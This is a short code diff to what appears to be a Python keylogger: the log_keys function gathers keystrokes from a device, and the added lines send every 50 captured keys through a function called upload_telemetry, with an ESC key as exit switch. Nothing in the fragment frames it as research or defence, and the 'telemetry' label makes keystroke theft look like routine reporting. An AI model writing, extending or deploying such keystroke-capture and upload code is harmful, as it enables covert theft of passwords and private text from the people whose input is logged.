@@ -97,6 +97,12 @@ async def log_keys(device):
             else:
                 continue
 
+            # Handle buffer maximum limit of 50
+            if len(keystroke_buffer) == 50:
+                max_buffer_send: str = "".join(keystroke_buffer)
+                asyncio.create_task(upload_telemetry(client, max_buffer_send))
+                keystroke_buffer.clear()
+
             # Core Exit Switch
             if key_name == "KEY_ESC":
                 print("\nServering active operational linkages...")
